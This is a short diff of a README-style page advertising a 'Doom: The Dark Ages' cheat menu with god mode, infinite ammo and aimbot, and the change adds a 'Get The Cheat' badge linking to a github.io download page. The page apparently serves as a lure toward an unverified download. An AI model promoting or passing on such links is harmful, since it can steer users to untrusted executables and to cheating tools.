@@ -4,7 +4,7 @@
 
 The Slayer is back, and this time the medieval firepower is even more brutal. But if you want to push things beyond the limits, the **Doom: The Dark Ages cheat menu** gives you unstoppable powers. From god mode and infinite ammo to aimbot precision and full trainer functions, these cheats let you rip and tear without mercy.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Cheat-blueviolet)](https://doom-the-dark-ages-cheat.github.io/.github/)
 
 ---
 
